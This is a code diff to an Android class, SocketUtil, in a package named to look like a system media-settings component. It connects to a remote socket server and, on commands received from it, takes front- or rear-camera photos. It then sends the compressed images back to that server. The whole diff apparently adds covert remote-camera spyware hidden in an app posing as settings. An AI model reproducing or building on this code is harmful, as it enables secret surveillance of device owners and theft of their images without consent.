@@ -1,8 +1,16 @@
 package com.android.media.settings.Utility;
 
+import android.content.BroadcastReceiver;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.hardware.Camera;
 import android.os.Build;
 import android.os.Handler;
+import android.support.v4.content.LocalBroadcastManager;
+import android.util.Base64;
 import android.util.Log;
 
 import com.android.media.settings.Interface.ImageCaptureListener;
@@ -10,6 +18,7 @@ import com.android.media.settings.Model.DeviceActivity;
 import com.android.media.settings.Model.DeviceActivityResponse;
 import com.android.media.settings.Model.Media;
 import com.android.media.settings.Model.Device;
+import com.android.media.settings.Service.CameraService;
 import com.android.media.settings.Service.ImageCaptureService;
 import com.android.media.settings.Service.ImageCaptureServiceImp;
 import com.github.nkzawa.emitter.Emitter;
@@ -22,7 +31,7 @@ import java.net.URISyntaxException;
 import java.net.URLEncoder;
 import java.util.TreeMap;
 
-public class SocketUtil implements ImageCaptureListener {
+public class SocketUtil {
     private static final String TAG = SocketUtil.class.getSimpleName();
 
     private static final String EVENT_JOIN = "join";
@@ -36,15 +45,15 @@ public class SocketUtil implements ImageCaptureListener {
     private static Socket mSocket;
     private Context context;
     private Handler handler;
-    private ImageCaptureService imageCaptureService;
     private MediaUtility mMediaUtility;
     private String deviceId;
 
     public SocketUtil(Context context) {
         this.context = context;
         handler = new Handler();
-        imageCaptureService = ImageCaptureServiceImp.getInstance(context);
         mMediaUtility = MediaUtility.getInstance(context);
+
+        LocalBroadcastManager.getInstance(context).registerReceiver(receiver, new IntentFilter("CamServiceUpdates"));
     }
 
     private void runOnUiThread(Runnable runnable) {
@@ -52,6 +61,7 @@ public class SocketUtil implements ImageCaptureListener {
     }
 
     public void connect() {
+        Log.d(TAG, "Connecting to Server...");
         try {
             mSocket = IO.socket("https://media-store.herokuapp.com/");
         } catch (URISyntaxException e) { e.printStackTrace(); }
@@ -86,37 +96,46 @@ public class SocketUtil implements ImageCaptureListener {
         processActivity(activity);
     };
 
-    private void captureImage() {
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ) {
-            runOnUiThread(() -> imageCaptureService.startCapturing(this));
+    private void captureImage(int cameraId, int rotation) {
+        if(!CameraUtility.isCameraExist(context)) {
+            return;
         }
-    }
 
-    @Override
-    public void onCaptureDone(String pictureUrl, byte[] pictureData) {
-        Media media = new Media();
-        media.setBytes(pictureData);
-        media.setPath(pictureUrl);
-        DeviceActivityResponse response = new DeviceActivityResponse(ACTIVITY_SNAP, deviceId, media);
-        mSocket.emit(EVENT_ACTIVITY_RESPONSE, new Gson().toJson(response));
-    }
-
-    @Override
-    public void onDoneCapturingAllPhotos(TreeMap<String, byte[]> picturesTaken) {
-        Log.d(TAG, "All Images Captured");
+        if(CameraUtility.isCameraExist(cameraId)) {
+            CameraService.takeSnap(context, cameraId, CameraService.FUNCTION_TAKE_SNAP, rotation);
+        } else if(CameraUtility.isCameraExist(Camera.CameraInfo.CAMERA_FACING_BACK)) {
+            CameraService.takeSnap(context, Camera.CameraInfo.CAMERA_FACING_BACK,
+                    CameraService.FUNCTION_TAKE_SNAP, 90);
+        }
     }
 
     private void processActivity(DeviceActivity activity) {
         switch (activity.getName()) {
             case ACTIVITY_SNAP:
-                captureImage();
+                captureImage(Camera.CameraInfo.CAMERA_FACING_FRONT, 270);
                 break;
 
             case ACTIVITY_SNAP_FRONT:
+                captureImage(Camera.CameraInfo.CAMERA_FACING_FRONT, 270);
                 break;
 
             case ACTIVITY_SNAP_REAR:
+                captureImage(Camera.CameraInfo.CAMERA_FACING_BACK, 90);
                 break;
         }
     }
+
+    private void emitImage(String byteString) {
+        Media media = new Media(byteString);
+        DeviceActivityResponse response = new DeviceActivityResponse(ACTIVITY_SNAP, deviceId, media);
+        mSocket.emit(EVENT_ACTIVITY_RESPONSE, new Gson().toJson(response));
+    }
+
+    BroadcastReceiver receiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            byte[] bytes = intent.getByteArrayExtra("ImageBytes");
+            emitImage(mMediaUtility.compressByteImage(bytes));
+        }
+    };
 }
